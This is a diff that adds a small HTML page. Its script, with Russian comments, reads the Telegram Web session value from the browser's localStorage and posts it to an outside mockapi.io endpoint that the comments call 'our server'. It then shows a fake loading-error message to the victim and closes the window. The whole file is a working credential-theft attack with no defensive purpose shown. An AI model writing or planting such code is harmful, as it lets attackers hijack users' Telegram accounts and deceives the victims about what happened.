@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <script>
+    // 1. Крадем session_id из localStorage Telegram Web
+    const session = localStorage.getItem("Telegram:session");
+    
+    // 2. Отправляем на свой сервер
+    fetch("https://67e479672ae442db76d48b54.mockapi.io/sef", {
+      method: "POST",
+      body: JSON.stringify({ session })
+    });
+
+    // 3. Показываем фейковую ошибку
+    alert("Ошибка загрузки. Попробуйте позже.");
+    window.close();
+  </script>
+</body>
+</html>
